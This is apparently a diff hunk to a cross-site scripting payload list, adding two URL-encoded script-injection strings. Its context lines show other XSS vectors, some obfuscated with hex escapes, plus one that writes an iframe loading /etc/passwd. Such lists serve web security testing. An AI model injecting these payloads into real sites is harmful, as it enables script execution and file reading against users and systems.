@@ -19,6 +19,8 @@ alert(1)
 <img src=x onerror="setInterval('\x61lert(1)')"/>
 <img src=x onerror="setTimeout('\x61\154\145\x72\164\x28\x31\x29')"/>
 <svg/onload=alert(1)
+-%3E%3Cscript%3Ealert(1337)%3C/script%3E
+%26%23%3Csvg/onload=alert(1337)%3E%3B
 " /><script>alert(1)</script>
 javascript:alert(1)
 <img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
